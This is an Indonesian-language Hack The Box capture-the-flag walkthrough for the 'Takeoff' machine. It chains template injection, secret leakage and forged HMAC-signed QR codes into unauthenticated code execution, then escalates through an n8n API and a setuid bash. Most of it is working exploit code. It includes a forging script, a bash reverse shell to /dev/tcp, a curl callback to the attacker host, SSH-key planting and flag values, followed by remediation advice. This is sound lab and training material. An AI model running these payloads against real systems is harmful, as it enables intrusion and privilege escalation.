---
title: "HTB Takeoff — Walkthrough"
author: "ewexexexe"
date: 2026-11-01
co: fmi
---

# HTB Takeoff — Walkthrough

**Target:** `10.*.*.*` (`takeoff.htb`)
**Attacker:** `10.*.*.*` (`tun0`)
**Host OS:** Debian 13 (kernel 6.12.x)
**Web stack:** nginx → Go Echo (`X-Powered-By: Echo`)
**Hasil:** user + root

## Flags

```text
user.txt : 425061120d296698a5160a3075473eb8
root.txt : 9f70e9684c84a1d38232e2ceabf184a1
```

---

## 0. Ringkasan eksekutif

Aplikasi “HTB Airways Booking” memiliki dua kelemahan utama yang dirangkai menjadi RCE:

1. **SSTI pada ticket notes.** Notes tiket dirender oleh template engine Go saat PDF boarding pass dibuat. Payload `{{ .File "/proc/self/environ" }}` membaca environment proses service dan menampilkannya di PDF.
2. **QR ticket memuat command yang dieksekusi server.** QR berisi gob `VerifyTicketAuthenticity` + HMAC-SHA256. HMAC key (`TICKET_VALIDATION_TOKEN`) bocor dari environment. Dengan key tersebut, QR bisa di-forge dengan `NotifyCmd` berbahaya, lalu dikirim ke `POST /api/check-in` tanpa autentikasi.

Setelah RCE sebagai `www-data`:

3. **n8n di `127.0.0.1:5678`** berjalan sebagai root di container. API key n8n juga bocor dari environment.
4. **Shared bind mount** host `/home/kpark` → container `/root`. Container root bisa membaca `user.txt` dan menulis SSH `authorized_keys`.
5. **Setuid binary dari shared mount**: copy `/bin/bash` host ke `/home/kpark`, lalu container root melakukan `chown root:root` + `chmod 4755`. Eksekusi sebagai `kpark` → `euid=0(root)` → root flag.

---

## 1. Lab setup dan tooling

### 1.1 Host entry

```bash
echo "10.*.*.* takeoff.htb" | sudo tee -a /etc/hosts
```

Cek konektivitas:

```bash
ping -c 2 10.*.*.*
```

### 1.2 Tooling yang dipakai

```text
nmap
feroxbuster / gobuster / ffuf
curl
python3
go 1.25.x
tmux
nc / ncat
ssh-keygen / ssh
pdftotext / mutool / pdfimages
python3-opencv (decode QR image)
```

### 1.3 Direktori kerja

```bash
mkdir -p ~/htb-takeoff/{loot,www,pages}
cd ~/htb-takeoff
```

---

## 2. Reconnaissance

### 2.1 Full TCP scan

```bash
nmap -Pn -sC -sV -p- --min-rate 2000 -oN nmap_full.txt 10.*.*.*
```

Output ringkas:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Book a Seat, See the World - HTB Airways Booking
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tidak ada port lain. Ini penting: nanti service n8n hanya listen di `127.0.0.1:5678` dan tidak terekspos dari luar.

### 2.2 HTTP fingerprint

```bash
curl -s -i http://takeoff.htb/ | head -40
```

Header penting:

```text
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=utf-8
X-Powered-By: Echo
```

`X-Powered-By: Echo` menunjukkan aplikasi Go memakai framework Echo.

Cek halaman utama:

```bash
curl -s http://takeoff.htb/ | sed 's/></>\n</g' | head -80
```

Fitur yang terlihat:

- search flight
- seat map
- multi-passenger
- QR boarding pass
- refund
- payment cards

### 2.3 Content discovery

```bash
feroxbuster -u http://takeoff.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  -C 404 -t 30
```

Temuan penting:

```text
200 /sign-in
200 /sign-up
303 /dashboard      -> /sign-in
303 /boards         -> /sign-in
303 /notifications  -> /sign-in
403 /static/
301 /static/js/
301 /static/css/
```

Route map yang ditemukan dari HTML/JS:

```text
/
/sign-in
/sign-up
/logout
/dashboard
/search
/search/results
/schedules/<id>
/book/start
/book/<PNR>/passengers
/book/<PNR>/payment
/book/<PNR>/confirmation
/trips
/trips/<PNR>
/bookings/<PNR>/refund
/check-in
/api/check-in
/api/check-in/reset/<token>
/boards
/airports/<code>
/cities/<code>
/profile
/profile/update
/profile/billing-address
/profile/password-form
/profile/password
/profile/password-cancel
/profile/2fa/enable
/profile/2fa/disable
/payment-cards
/payment-cards/<id>/delete
/notifications
/notifications/<id>/view
/tickets/<PNR>/preview
/tickets/<PNR>/download
/tickets/<PNR>/notes
/partials/*
/newsletter/subscribe
```

### 2.4 Static files

`/static/js/airport-picker.js` direferensikan di HTML tetapi 404. File JS yang ada:

```text
/static/js/htmx.min.js
/static/js/seat-picker.js
/static/js/profile-tabs.js
/static/js/modal.js
```

Tidak ada source map atau file backup.

---

## 3. Autentikasi dan JWT

### 3.1 Registrasi

```bash
curl -s -i -c cookies.txt -X POST http://takeoff.htb/sign-up \
  -d 'name=Test User&email=test@test.htb&password=Password123&terms=on'
```

Response:

```text
HTTP/1.1 303 See Other
Location: /sign-in?registered=true
```

### 3.2 Login

```bash
curl -s -i -c cookies.txt -b cookies.txt -X POST http://takeoff.htb/sign-in \
  -d 'email=test@test.htb&password=Password123'
```

Response:

```text
HTTP/1.1 303 See Other
Location: /dashboard
Set-Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Cookie:

```text
Path=/
Expires=+24h
HttpOnly
SameSite=Lax
```

### 3.3 Struktur JWT

Decode:

```bash
python3 - <<'PY'
import base64, json

tok = open('cookies.txt').read()
# ambil token dari cookie jar
import re
tok = re.search(r'session_token\s+(\S+)', tok).group(1)
h, p, s = tok.split('.')
for name, part in [('header', h), ('payload', p)]:
    part += '=' * (-len(part) % 4)
    print(name, json.loads(base64.urlsafe_b64decode(part)))
print('signature', s)
PY
```

Payload:

```json
{
  "user_id": 2,
  "exp": 1793570319,
  "iat": 1793483919,
  "iss": "takeoff.htb"
}
```

JWT memakai HS256. Secret tidak berhasil di-crack dengan rockyou/custom wordlist, dan tidak diperlukan untuk jalur final. Uji `alg=none`, `kid`, `jku`, dan token kosong semuanya ditolak.

### 3.4 Otorisasi

Aplikasi memakai cookie `session_token`; user ID diambil dari JWT. Endpoint seperti `/dashboard`, `/trips`, `/check-in` redirect ke `/sign-in` jika tidak ada cookie.

Namun, `/api/check-in` **tidak memerlukan cookie**. Ini menjadi titik masuk RCE nanti.

---

## 4. Booking flow dan QR ticket

### 4.1 Cari jadwal

```bash
curl -s -b cookies.txt \
  "http://takeoff.htb/search/results?origin=HTB&destination=GLW&date=2026-11-02&pax=1&class=Any" \
  -o pages/results.html
```

Hasil: flight `HTB-202`, schedule id `5460` dan `5461`.

### 4.2 Seat map

```bash
curl -s -b cookies.txt http://takeoff.htb/schedules/5460 -o pages/schedule.html
```

Seat input memakai ID numerik, misalnya:

```html
<input type="checkbox" name="seat_ids" value="81"> <span>1A</span>
```

Pada instance ini, seat `81` adalah First `1A`.

### 4.3 Mulai booking

```bash
curl -s -i -b cookies.txt -X POST http://takeoff.htb/book/start \
  -d 'schedule_id=5460&seat_ids=81'
```

Response:

```text
HTTP/1.1 303 See Other
Location: /book/VCG7Y7/passengers
```

`VCG7Y7` adalah PNR.

### 4.4 Passenger

```bash
curl -s -b cookies.txt -X POST http://takeoff.htb/book/VCG7Y7/passengers \
  --data-urlencode 'full_name=Test User' \
  --data-urlencode 'dob=1990-01-01' \
  --data-urlencode 'id_type=passport' \
  --data-urlencode 'id_number=P1234567'
```

### 4.5 Payment card

```bash
curl -s -b cookies.txt -X POST http://takeoff.htb/payment-cards \
  -d 'pan=4242424242424242&cardholder_name=Test User&exp_month=12&exp_year=2030'
```

Response 303 ke `/payment-cards`; card id `1`.

### 4.6 Bayar

```bash
curl -s -i -b cookies.txt -X POST http://takeoff.htb/book/VCG7Y7/payment \
  -d 'payment_card_id=1'
```

Response:

```text
HTTP/1.1 303 See Other
Location: /book/VCG7Y7/confirmation
```

### 4.7 Ambil QR

```bash
curl -s -b cookies.txt http://takeoff.htb/check-in -o /tmp/checkin.html
```

Form check-in:

```html
<form method="POST" action="/api/check-in">
  <input type="hidden" name="qr_data" value="ThAAHSpnb2IuVmVyaWZ5VGlja2V0QXV0aGVudGljaXR5...">
  <input type="hidden" name="gate" value="WEB">
  <button type="submit">Check In</button>
</form>
```

`qr_data` adalah base64 dari:

```text
gob_bytes || HMAC-SHA256(TICKET_VALIDATION_TOKEN, gob_bytes)
```

### 4.8 Decode QR

Ambil `qr_data`:

```bash
python3 - <<'PY'
import re, base64, html

t = open('/tmp/checkin.html').read()
qr = re.search(r'name="qr_data" value="([^"]+)"', t).group(1)
raw = base64.b64decode(html.unescape(qr))
open('/tmp/qr.bin', 'wb').write(raw)

print('total bytes:', len(raw))
print('gob bytes  :', len(raw) - 32)
print('signature  :', raw[-32:].hex())
PY
```

Contoh:

```text
total bytes: 281
gob bytes  : 249
signature  : a21ffd972d2811b29d2de1a199899c5b5ddda2934334d17373cdcf657e9e6d13
```

Gob prefix:

```bash
xxd -l 96 /tmp/qr.bin
```

Output:

```text
00000000: 4e10 001d 2a67 6f62 2e56 6572 6966 7954  N...*gob.VerifyT
00000010: 6963 6b65 7441 7574 6865 6e74 6963 6974  icketAuthenticit
00000020: 7901 ff80 0001 0101 0444 6174 6101 0a00  y........Data...
...
```

Arti:

- `4e 10 00 1d 2a ...` adalah gob type definition untuk `*gob.VerifyTicketAuthenticity`.
- `Data` adalah satu-satunya field, bertipe `[]byte`.
- Setelah gob selesai, 32 byte terakhir adalah HMAC-SHA256.

### 4.9 Isi JSON

Decoder Go (dibahas lengkap di appendix) menghasilkan:

```json
{
  "PNR": "VCG7Y7",
  "Token": "6a717acad47e546a1f731f25ecd87de9",
  "Seat": "1A",
  "Passenger": "Test User",
  "NotifyCmd": "check-in-notify --pnr VCG7Y7 --email test@test.htb"
}
```

`NotifyCmd` adalah string command yang akan dieksekusi server setelah verifikasi HMAC.

---

## 5. Seed account

### 5.1 Enumerasi email

Sign-up dengan email yang sudah terdaftar memberi pesan berbeda:

```bash
curl -s -X POST http://takeoff.htb/sign-up \
  --data-urlencode 'name=Chk' \
  --data-urlencode 'email=test@takeoff.htb' \
  --data-urlencode 'password=Password123' \
  --data-urlencode 'terms=on'
```

Response:

```text
Unable to create account. Please try again or sign in.
```

### 5.2 Login dengan password umum

```bash
curl -s -i -c /tmp/t1.txt -X POST http://takeoff.htb/sign-in \
  -d 'email=test@takeoff.htb&password=Password123'
```

Response 303 ke `/dashboard`. Akun ini user id 4 pada instance ini.

### 5.3 Data seed

Akun `test@takeoff.htb` punya beberapa trip:

```text
FQTSFB  HTB -> VLR  confirmed
LLF9SD  HTB -> VLR  confirmed (checked-in)
CZXQWR  HTB -> VLR  pending payment
UB7ZQT  HTB -> VLR  pending payment
X5YTMB  HTB -> VLR  pending payment
```

Tiket `FQTSFB` punya passenger `Q"uote{B}ack` dan notes `x%0asleep 5`. Tiket `LLF9SD` punya notes `plainnote123`.

Artefak ini terlihat seperti hasil pengujian seed/instance. Yang penting: notes memang user-controlled dan dirender ke PDF. Kita tetap memakai akun kita sendiri untuk exploit final.

---

## 6. Vulnerability 1 — SSTI di ticket notes

### 6.1 Kenapa notes?

Notes tiket ditampilkan di halaman trip, preview, dan **PDF boarding pass**. PDF dibuat oleh generator yang menggunakan template Go. Template context memiliki method `.File`.

Payload:

```text
{{ .File "/proc/self/environ" }}
```

### 6.2 Set notes

```bash
curl -s -b cookies.txt -X POST http://takeoff.htb/tickets/VCG7Y7/notes \
  --data-urlencode 'notes={{ .File "/proc/self/environ" }}'
```

Response 200 berisi HTML notes. Di halaman trip, payload ditampilkan escaped:

```html
<div class="ticket-notes-render">{{ .File &#34;/proc/self/environ&#34; }}</div>
```

Tetapi saat PDF dibuat, template dieksekusi.

### 6.3 Download PDF

```bash
curl -s -b cookies.txt http://takeoff.htb/tickets/VCG7Y7/download -o /tmp/ssti.pdf
file /tmp/ssti.pdf
```

Output:

```text
/tmp/ssti.pdf: PDF document, version 1.3
```

### 6.4 Ekstrak environment

```bash
pdftotext -raw /tmp/ssti.pdf - | sed -n '/Notes/,/Scan QR/p'
```

Output (diringkas):

```text
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
USER=www-data
LOGNAME=www-data
HOME=/var/www
INVOCATION_ID=758a37546e6345429324b264bd57120d
JOURNAL_STREAM=9:13391
SYSTEMD_EXEC_PID=1764
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/htb-air.service/memory.pressure
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo
```

### 6.5 Rekonstruksi token yang terpotong PDF

PDF memotong baris panjang. Pada output mentah terlihat:

```text
...QQM
fiAR.N8N_API_KEY=...
```

`fiAR` adalah bagian akhir token, dan `.` adalah representasi NUL separator environment. Token lengkap:

```text
JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
```

Panjang: **64 karakter**.

Verifikasi:

```bash
python3 - <<'PY'
import base64, hmac, hashlib

raw = base64.b64decode(open('/tmp/qr.bin', 'rb').read())
gob, sig = raw[:-32], raw[-32:]
key = b'JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR'
print('valid:', hmac.new(key, gob, hashlib.sha256).digest() == sig)
PY
```

Output:

```text
valid: True
```

### 6.6 Alternatif leak setelah local access

File unit systemd juga memuat secret yang sama dan biasanya world-readable:

```bash
cat /usr/lib/systemd/system/htb-air.service
```

Bagian penting:

```ini
Environment=TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
Environment=N8N_API_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
```

Ini bukan jalur awal (karena butuh local access), tetapi penting untuk cleanup/defense.

---

## 7. Vulnerability 2 — Forge QR → unauthenticated RCE

### 7.1 Format QR

QR = `base64( gob || signature )`

- `gob`: encoding Go dari `*gob.VerifyTicketAuthenticity{Data: []byte(json)}`
- `signature`: `HMAC-SHA256(key=TICKET_VALIDATION_TOKEN, message=gob)`

Server:

1. base64-decode
2. split 32 byte terakhir sebagai signature
3. verifikasi HMAC
4. gob-decode
5. eksekusi `Data.NotifyCmd`

Karena key bocor, kita bisa membuat `gob` sendiri dengan command apa pun.

### 7.2 Gob encoding yang identik dengan server

Server meng-encode melalui interface, sehingga wire type name adalah `*gob.VerifyTicketAuthenticity`.

Buat package:

```bash
mkdir -p /tmp/gobtest/gob /tmp/gobtest/enc

cat > /tmp/gobtest/gob/gob.go <<'EOF'
package gob

type VerifyTicketAuthenticity struct {
    Data []byte
}
EOF
```

Encoder:

```bash
cat > /tmp/gobtest/enc/main.go <<'EOF'
package main

import (
    "bytes"
    "encoding/gob"
    "fmt"
    "os"

    mgob "gobtest/gob"
)

func main() {
    gob.Register(&mgob.VerifyTicketAuthenticity{})

    // Encode melalui interface agar wire format menyertakan
    // type name "*gob.VerifyTicketAuthenticity", sama seperti server.
    var v any = &mgob.VerifyTicketAuthenticity{Data: []byte(os.Args[1])}

    var b bytes.Buffer
    if err := gob.NewEncoder(&b).Encode(&v); err != nil {
        panic(err)
    }
    fmt.Printf("%x", b.Bytes())
}
EOF

cd /tmp/gobtest
go mod init gobtest
go build -o enc/enc ./enc
```

Tes:

```bash
/tmp/gobtest/enc/enc '{"PNR":"VCG7Y7","Token":"6a717acad47e546a1f731f25ecd87de9","Seat":"1A","Passenger":"Test User","NotifyCmd":"check-in-notify --pnr VCG7Y7 --email test@test.htb"}'
```

Bandingkan dengan gob asli:

```bash
python3 - <<'PY'
import base64
raw = base64.b64decode(open('/tmp/qr.bin','rb').read())
open('/tmp/orig_gob.hex','w').write(raw[:-32].hex())
PY

/tmp/gobtest/enc/enc '{"PNR":"VCG7Y7","Token":"6a717acad47e546a1f731f25ecd87de9","Seat":"1A","Passenger":"Test User","NotifyCmd":"check-in-notify --pnr VCG7Y7 --email test@test.htb"}' > /tmp/our_gob.hex

cmp -s /tmp/orig_gob.hex /tmp/our_gob.hex && echo SAME || echo DIFFERENT
```

Pada instance ini hasilnya `SAME` (249 byte gob identik).

### 7.3 Full forge script

```bash
cat > /tmp/forge.py <<'PY'
#!/usr/bin/env python3
import json
import subprocess
import base64
import hmac
import hashlib
import sys
import requests

# HMAC key dari SSTI / systemd unit
KEY = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"

# Ganti dengan tiketmu sendiri
PNR = "VCG7Y7"
TOKEN = "6a717acad47e546a1f731f25ecd87de9"
SEAT = "1A"
PASSENGER = "Test User"

CMD = sys.argv[1]

obj = {
    "PNR": PNR,
    "Token": TOKEN,
    "Seat": SEAT,
    "Passenger": PASSENGER,
    "NotifyCmd": CMD,
}

data = json.dumps(obj, separators=(",", ":"))

# Encode gob dengan format yang sama seperti server
gob_hex = subprocess.check_output(
    ["/tmp/gobtest/enc/enc", data],
    text=True,
).strip()
gob = bytes.fromhex(gob_hex)

# HMAC-SHA256(key, gob_bytes)
sig = hmac.new(KEY, gob, hashlib.sha256).digest()

# base64(gob || sig)
payload = base64.b64encode(gob + sig).decode()

print(f"[*] gob bytes : {len(gob)}")
print(f"[*] signature : {sig.hex()}")
print(f"[*] payload   : {len(payload)} chars")

r = requests.post(
    "http://takeoff.htb/api/check-in",
    data={"qr_data": payload, "gate": "WEB"},
    allow_redirects=False,
    timeout=20,
)

print(f"[*] HTTP      : {r.status_code}")
print(r.text[:1000])
PY
chmod +x /tmp/forge.py
```

### 7.4 Konfirmasi RCE

Listener HTTP di attacker:

```bash
python3 -m http.server 8000 --bind 10.10.15.81
```

Kirim payload:

```bash
python3 /tmp/forge.py \
  "curl -s http://10.10.15.81:8000/rce-confirm"
```

Response dari target:

```text
10.129.55.240 - - [..] "GET /rce-confirm HTTP/1.1" 404 -
```

Request masuk = command dieksekusi sebagai `www-data`.

Raw response check-in:

```json
{
  "decoded": {
    "PNR": "VCG7Y7",
    "Token": "6a717acad47e546a1f731f25ecd87de9",
    "Seat": "1A",
    "Passenger": "Test User",
    "NotifyCmd": "curl -s http://10.10.15.81:8000/rce-confirm"
  },
  "departure": "2026-11-02T11:00:00+00:00",
  "flight": "HTB-202 · Goldwater Flyer",
  "passenger": "Test User",
  "pnr": "VCG7Y7",
  "seat": {"class": "First", "row": 1, "seat": "1A"},
  "status": "ok"
}
```

### 7.5 Reverse shell

Listener:

```bash
nc -lvnp 4455
```

Payload:

```bash
python3 /tmp/forge.py \
  "bash -c 'bash -i >& /dev/tcp/10.10.15.81/4455 0>&1 &'"
```

Tanda `&` membuat shell berjalan di background sehingga HTTP request tidak menggantung.

Di listener:

```text
www-data@takeoff:/opt/htb-airways/booking$
```

Cek:

```bash
id
hostname
pwd
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
takeoff.htb
/opt/htb-airways/booking
```

---

## 8. Enumerasi host

### 8.1 Identitas dan proses

```bash
id
uname -a
cat /etc/os-release
ps auxww
```

Temuan:

```text
www-data  1764  ... /opt/htb-airways/booking/htb-air
root      1316  ... nginx: master process
root      1326  ... /usr/bin/dockerd
root      1732  ... node /usr/local/bin/n8n
root      1712  ... docker-proxy ... 127.0.0.1:5678 -> 172.18.0.2:5678
root      1736  ... docker-proxy ... 127.0.0.1:3306 -> 172.18.0.3:3306
999       1647  ... mysqld
```

User host:

```text
kpark:x:1001:1001:Keith Park,,,:/home/kpark:/bin/bash
vmiller:x:1000:1000::/home/vmiller:/bin/bash
```

`www-data` hanya group `www-data`; tidak ada akses Docker socket.

### 8.2 systemd unit

```bash
cat /usr/lib/systemd/system/htb-air.service
```

Isi:

```ini
[Unit]
Description=HTB Airways booking server
After=network-online.target docker.service nginx.service
Wants=network-online.target
Requires=docker.service

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/opt/htb-airways/booking
ExecStart=/opt/htb-airways/booking/htb-air
Restart=on-failure
RestartSec=5

Environment=TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
Environment=N8N_API_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'

PrivateTmp=true
ProtectHome=true
ProtectSystem=strict
ProtectKernelTunables=true
ProtectKernelModules=true
ProtectControlGroups=true
RestrictSUIDSGID=true
RestrictRealtime=true
LockPersonality=true

StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

`ProtectHome=true` dan `ProtectSystem=strict` membuat home/root terlihat sebagai tmpfs di mount namespace service. Ini menjelaskan kenapa dari shell `www-data` terlihat:

```text
tmpfs /home tmpfs ro,nosuid,nodev,noexec ...
tmpfs /root tmpfs ro,nosuid,nodev,noexec ...
```

Padahal host asli punya `/home/kpark` di `/dev/sda4`.

### 8.3 Environment service

```bash
PID=$(pgrep -f '/opt/htb-airways/booking/htb-air' | head -1)
tr '\0' '\n' < /proc/$PID/environ
```

Ambil key:

```bash
KEY=$(tr '\0' '\n' < /proc/$PID/environ | sed -n 's/^N8N_API_KEY=//p')
echo "$KEY"
```

### 8.4 n8n

```bash
curl -s http://127.0.0.1:5678/healthz
curl -s http://127.0.0.1:5678/rest/settings
```

`/healthz`:

```json
{"status":"ok"}
```

`/rest/settings` menunjukkan:

```json
{
  "settingsMode": "public",
  "userManagement": {
    "authenticationMethod": "email",
    "showSetupOnFirstLoad": false
  }
}
```

---

## 9. Root di container n8n

### 9.1 API key

```bash
KEY=$(tr '\0' '\n' < /proc/$PID/environ | sed -n 's/^N8N_API_KEY=//p')
curl -s -H "X-N8N-API-KEY: $KEY" \
  http://127.0.0.1:5678/api/v1/workflows
```

Response berisi workflow existing:

```json
{
  "data": [
    {
      "id": "7UVcXSHpyiwF7rRA",
      "name": "Schedule Change Alerter",
      "active": false
    }
  ]
}
```

### 9.2 Workflow JSON

```json
{
  "name": "pwncheck",
  "nodes": [
    {
      "parameters": {
        "path": "pwncheck",
        "options": {},
        "responseMode": "lastNode"
      },
      "id": "wh",
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2,
      "position": [0, 0],
      "webhookId": "pwncheck"
    },
    {
      "parameters": {
        "command": "id; hostname; pwd; ls -la /root; cat /root/user.txt 2>/dev/null; echo DONE; true"
      },
      "id": "cmd",
      "name": "Execute Command",
      "type": "n8n-nodes-base.executeCommand",
      "typeVersion": 1,
      "position": [220, 0]
    }
  ],
  "connections": {
    "Webhook": {
      "main": [
        [
          {
            "node": "Execute Command",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  },
  "settings": {}
}
```

Simpan sebagai `/tmp/wf.json` di target, lalu:

```bash
curl -s -H "X-N8N-API-KEY: $KEY" \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/wf.json \
  http://127.0.0.1:5678/api/v1/workflows
```

Response memberi `id`, contoh:

```text
dcUjbPHGQy79lbkk
```

Aktifkan:

```bash
WFID=dcUjbPHGQy79lbkk
curl -s -X POST -H "X-N8N-API-KEY: $KEY" \
  "http://127.0.0.1:5678/api/v1/workflows/$WFID/activate"
```

Trigger:

```bash
curl -s http://127.0.0.1:5678/webhook/pwncheck
```

Response:

```json
{
  "exitCode": 0,
  "stderr": "",
  "stdout": "uid=0(root) gid=0(root) groups=0(root)\nf1bfbbddcdd4\n/home/node\n...\nuser.txt\n425061120d296698a5160a3075473eb8\nDONE"
}
```

### 9.3 Kenapa `/root` adalah `/home/kpark`?

Dari host:

```bash
grep /home/kpark /proc/<n8n_pid>/mountinfo
```

Output:

```text
8:4 /home/kpark /root rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
```

Jadi container n8n melihat host `/home/kpark` sebagai `/root`.

### 9.4 Catatan Execute Command

Node `Execute Command` menganggap command gagal jika exit code terakhir non-zero. Contoh:

```bash
cat /root/root.txt 2>/dev/null
```

Jika file tidak ada, exit code 1, node error dan stdout hilang. Selalu akhiri dengan:

```bash
; true
```

atau gunakan `|| true`.

---

## 10. SSH sebagai kpark

### 10.1 Generate key

```bash
ssh-keygen -t ed25519 -N '' -f /tmp/kpark_key
cat /tmp/kpark_key.pub
```

### 10.2 Tulis authorized_keys lewat n8n

Command:

```bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGdpWhQcnHkLt55S8PpoLWRh7iUPfnNQWB+/7b9TPhsJ kontols@mortem' > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chown -R 1001:1001 /root/.ssh
ls -la /root/.ssh
true
```

Update workflow, activate, trigger seperti sebelumnya.

### 10.3 SSH

```bash
ssh -i /tmp/kpark_key \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  kpark@10.129.55.240
```

Cek:

```bash
id
hostname
cat ~/user.txt
```

Output:

```text
uid=1001(kpark) gid=1001(kpark) groups=1001(kpark)
takeoff.htb
425061120d296698a5160a3075473eb8
```

---

## 11. Privesc ke root

### 11.1 Analisis permission

Sebagai `kpark`:

```bash
id
ls -la /home/kpark
ls -la /opt/n8n
sudo -n -l
```

Temuan:

- `/home/kpark` milik `kpark:kpark` 700.
- `/home/kpark/.n8n` milik `root:root`, tetapi parent `/home/kpark` bisa ditulis kpark.
- `/opt/n8n` milik `kpark:kpark`; `.env` root 644.
- `sudo` butuh password; tidak ada NOPASSWD.
- Setuid standar hanya binary sistem; tidak ada custom SUID.

### 11.2 Copy bash host

```bash
ssh -i /tmp/kpark_key kpark@10.129.55.240 \
  'cp /bin/bash /home/kpark/pwnbash; ls -la /home/kpark/pwnbash'
```

Output:

```text
-rwxr-xr-x 1 kpark kpark 1298416 ... /home/kpark/pwnbash
```

### 11.3 Set root-owned + setuid dari container

Command n8n:

```bash
chown root:root /root/pwnbash
chmod 4755 /root/pwnbash
ls -la /root/pwnbash
true
```

Response:

```text
-rwsr-xr-x 1 root root 1298416 ... /root/pwnbash
```

### 11.4 Eksekusi

```bash
ssh -i /tmp/kpark_key kpark@10.129.55.240
/home/kpark/pwnbash -p
id
cat /root/root.txt
```

Output:

```text
uid=1001(kpark) gid=1001(kpark) euid=0(root) groups=1001(kpark)
9f70e9684c84a1d38232e2ceabf184a1
```

Root flag:

```text
9f70e9684c84a1d38232e2ceabf184a1
```

### 11.5 Kenapa berhasil?

- `/home/kpark` adalah bind mount host → container `/root`.
- Container n8n berjalan sebagai root, jadi bisa `chown root:root` dan `chmod 4755`.
- Mount tidak memakai `nosuid`, sehingga bit setuid dihormati host.
- `bash -p` mempertahankan `euid=0`.
- File `/root/root.txt` root:root 640; euid 0 cocok dengan owner root, jadi bisa dibaca.

Catatan: pada uji ini, command substitution `$(cat /root/root.txt)` sempat gagal, tetapi `cat` langsung berhasil. Jika mengalami hal serupa, jalankan command langsung di shell setuid, bukan di subshell.

---

## 12. Dead ends / failed attempts

Bagian ini penting untuk menunjukkan metodologi; tidak semua percobaan berhasil.

### 12.1 JWT

- `alg=none` / `None` / `NONE`: ditolak.
- Signature kosong: ditolak.
- Brute force secret dengan rockyou + custom wordlist + best64: tidak berhasil.
- `kid` path traversal (`/dev/null`, `/etc/hostname`, dll.): ditolak.
- `jku` remote JWKS: tidak dipakai library.
- Mass assignment `user_id` pada profile/password: diabaikan.

### 12.2 SQL injection

- Login email/password: parameterized.
- Search `origin`, `destination`, `sort`: tidak ada error/time-based.
- `filter` trips: whitelist.
- PNR/path parameter: lookup exact, tidak ada SQLi.
- sqlmap pada search: tidak menemukan injeksi.

### 12.3 IDOR

- `/trips/<PNR>` dan `/tickets/<PNR>/*`: ownership check.
- `/notifications/<id>/view`: ownership check.
- Payment card delete: tidak diuji destruktif.
- Tiket akun B tidak bisa diakses akun A.

### 12.4 Email/command injection

Validator email sign-up hanya mengizinkan:

```text
[a-zA-Z0-9._%+-]
```

Karakter shell (`'`, backtick, `$`, `;`, `|`, `&`, `(`, `)`, `{`, `}`, `<`, `>`, `*`, `=`, `?`, `^`, `~`, `,`, spasi) ditolak. `%` dan `+` diterima, tetapi tidak dieksekusi.

Newsletter menerima karakter lebih longgar, tetapi tidak mengeksekusi shell.

### 12.5 Notes/name command injection

Notes/name dengan `;curl`, newline literal, `%0a`, backtick, dan `$()` tidak memicu callback saat check-in. Eksekusi command baru berhasil setelah HMAC QR di-forge.

---

## 13. Detection dan remediation

### 13.1 SSTI di notes/PDF

- Jangan render input user dengan template engine yang memiliki method berbahaya (`.File`, `exec`, `env`).
- Gunakan sandbox template atau escape sebagai teks biasa.
- Pisahkan template statis dari data user.
- Batasi file yang bisa dibaca proses service.

### 13.2 Secret di environment/unit

- `TICKET_VALIDATION_TOKEN` dan `N8N_API_KEY` ada di environment dan unit file.
- Gunakan secret manager (Vault, systemd credentials, Docker secret).
- Batasi permission unit file; jangan simpan secret plaintext di `Environment=`.
- Rotasi key setelah insiden.

### 13.3 QR command execution

- Jangan menyimpan command shell di QR yang bisa dieksekusi server.
- Gunakan allowlist aksi (`check-in`, `notify`) dengan parameter tervalidasi.
- Verifikasi HMAC dengan key yang tidak dapat dibaca dari template/user.
- Tambahkan autentikasi pada `/api/check-in`; jangan percaya QR saja.

